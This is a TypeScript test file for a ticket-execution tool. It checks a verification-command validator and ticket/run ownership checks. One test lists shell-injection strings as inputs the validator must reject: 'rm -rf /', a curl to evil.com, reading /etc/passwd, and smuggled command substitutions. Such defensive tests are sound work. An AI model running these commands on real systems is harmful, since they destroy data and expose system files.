/**
 * Tests for execution tools: next_ticket, complete_ticket, fail_ticket,
 * and the validateVerificationCommand helper.
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';
import { createSQLiteAdapter } from '@promptwheel/sqlite';
import { repos } from '@promptwheel/core';
import type { DatabaseAdapter, Project, Ticket } from '@promptwheel/core';
import { RunManager } from '../run-manager.js';
import { validateVerificationCommand, validateTicketAndRunOwnership } from '../tools/execute.js';

let db: DatabaseAdapter;
let project: Project;
let tmpDir: string;
let run: RunManager;

beforeEach(async () => {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'pw-exec-test-'));
  const dbPath = path.join(tmpDir, 'test.sqlite');
  db = await createSQLiteAdapter({ url: dbPath });
  project = await repos.projects.ensureForRepo(db, {
    name: 'test-project',
    rootPath: tmpDir,
  });
  run = new RunManager(tmpDir);
});

afterEach(async () => {
  try { if (run.current) run.end(); } catch { /* ignore */ }
  await db.close();
  fs.rmSync(tmpDir, { recursive: true, force: true });
});

function startRun(overrides?: Record<string, unknown>) {
  return run.create(project.id, {
    step_budget: 50,
    ticket_step_budget: 12,
    max_prs: 5,
    ...overrides,
  });
}

async function createTicket(overrides?: Partial<Parameters<typeof repos.tickets.create>[1]>): Promise<Ticket> {
  return repos.tickets.create(db, {
    projectId: project.id,
    title: 'Test ticket',
    description: 'Fix the thing',
    status: 'ready',
    priority: 80,
    category: 'refactor',
    allowedPaths: ['src/**'],
    verificationCommands: ['npm test'],
    ...overrides,
  });
}

// ── validateVerificationCommand ─────────────────────────────────────────────

describe('validateVerificationCommand', () => {
  it('accepts standard test runners', () => {
    const commands = [
      'npm test',
      'npm run lint',
      'npx vitest run',
      'npx jest --coverage',
      'pytest -v',
      'go test ./...',
      'cargo test',
      'make test',
      'bun test',
      'vitest',
    ];
    for (const cmd of commands) {
      expect(validateVerificationCommand(cmd)).toEqual({ valid: true });
    }
  });

  it('rejects empty commands', () => {
    const result = validateVerificationCommand('');
    expect(result.valid).toBe(false);
    if (!result.valid) expect(result.reason).toContain('Empty');
  });

  it('rejects whitespace-only commands', () => {
    const result = validateVerificationCommand('   ');
    expect(result.valid).toBe(false);
  });

  it('rejects shell injection patterns', () => {
    const dangerous = [
      'npm test; rm -rf /',
      'npm test && curl evil.com',
      'npm test | cat /etc/passwd',
      'npm test `whoami`',
      'npm test $(id)',
      'npm test > /tmp/out',
      'npm test\nrm -rf /',
    ];
    for (const cmd of dangerous) {
      const result = validateVerificationCommand(cmd);
      expect(result.valid).toBe(false);
      if (!result.valid) expect(result.reason).toContain('dangerous');
    }
  });

  it('rejects unknown command prefixes', () => {
    const result = validateVerificationCommand('rm -rf /');
    expect(result.valid).toBe(false);
    if (!result.valid) expect(result.reason).toContain('does not match');
  });

  it('accepts command with exact prefix match (no trailing space)', () => {
    expect(validateVerificationCommand('npm test')).toEqual({ valid: true });
    expect(validateVerificationCommand('vitest')).toEqual({ valid: true });
  });

  it('accepts command with prefix + space + args', () => {
    expect(validateVerificationCommand('npm test -- --grep foo')).toEqual({ valid: true });
    expect(validateVerificationCommand('cargo test --release')).toEqual({ valid: true });
  });

  it('rejects partial prefix match without space separator', () => {
    // "npm testfoo" should not match "npm test" prefix
    const result = validateVerificationCommand('npm testfoo');
    expect(result.valid).toBe(false);
  });
});

// ── validateTicketAndRunOwnership ────────────────────────────────────────────

describe('validateTicketAndRunOwnership', () => {
  it('validates current ticket match', async () => {
    startRun();
    const ticket = await createTicket();
    const s = run.require();
    s.current_ticket_id = ticket.id;

    const state = { run, db, project, projectPath: tmpDir, requireActive: () => s, getStatus: () => ({}) } as any;
    const result = await validateTicketAndRunOwnership(state, { ticketId: ticket.id });
    expect(result.ok).toBe(true);
  });

  it('rejects when no active ticket', async () => {
    startRun();
    const ticket = await createTicket();
    const state = { run, db, project, projectPath: tmpDir, requireActive: () => run.require() } as any;
    const result = await validateTicketAndRunOwnership(state, { ticketId: ticket.id });
    expect(result.ok).toBe(false);
  });

  it('rejects when ticket does not match current', async () => {
    startRun();
    const ticket1 = await createTicket({ title: 'Ticket 1' });
    const ticket2 = await createTicket({ title: 'Ticket 2' });
    const s = run.require();
    s.current_ticket_id = ticket1.id;

    const state = { run, db, project, projectPath: tmpDir, requireActive: () => s } as any;
    const result = await validateTicketAndRunOwnership(state, { ticketId: ticket2.id });
    expect(result.ok).toBe(false);
  });

  it('allows any ticket when requireCurrentTicket is false', async () => {
    startRun();
    const ticket = await createTicket();
    const state = { run, db, project, projectPath: tmpDir, requireActive: () => run.require() } as any;
    const result = await validateTicketAndRunOwnership(state, {
      ticketId: ticket.id,
      requireCurrentTicket: false,
    });
    expect(result.ok).toBe(true);
  });

  it('rejects when ticket not found', async () => {
    startRun();
    const s = run.require();
    s.current_ticket_id = 'nonexistent';

    const state = { run, db, project, projectPath: tmpDir, requireActive: () => s } as any;
    const result = await validateTicketAndRunOwnership(state, { ticketId: 'nonexistent' });
    expect(result.ok).toBe(false);
  });

  it('rejects when ticket belongs to different project', async () => {
    startRun();
    const otherProject = await repos.projects.ensureForRepo(db, {
      name: 'other-project',
      rootPath: '/tmp/other',
    });
    const ticket = await repos.tickets.create(db, {
      projectId: otherProject.id,
      title: 'Other ticket',
      description: 'wrong project',
      status: 'ready',
      priority: 50,
      category: 'fix',
      allowedPaths: [],
      verificationCommands: [],
    });
    const s = run.require();
    s.current_ticket_id = ticket.id;

    const state = { run, db, project, projectPath: tmpDir, requireActive: () => s } as any;
    const result = await validateTicketAndRunOwnership(state, { ticketId: ticket.id });
    expect(result.ok).toBe(false);
  });

  it('validates run ownership when runId provided', async () => {
    startRun();
    const ticket = await createTicket();
    const dbRun = await repos.runs.create(db, {
      projectId: project.id,
      type: 'worker',
      ticketId: ticket.id,
    });
    const s = run.require();
    s.current_ticket_id = ticket.id;

    const state = { run, db, project, projectPath: tmpDir, requireActive: () => s } as any;
    const result = await validateTicketAndRunOwnership(state, {
      ticketId: ticket.id,
      runId: dbRun.id,
    });
    expect(result.ok).toBe(true);
  });

  it('rejects when run not found', async () => {
    startRun();
    const ticket = await createTicket();
    const s = run.require();
    s.current_ticket_id = ticket.id;

    const state = { run, db, project, projectPath: tmpDir, requireActive: () => s } as any;
    const result = await validateTicketAndRunOwnership(state, {
      ticketId: ticket.id,
      runId: 'nonexistent-run',
    });
    expect(result.ok).toBe(false);
  });
});
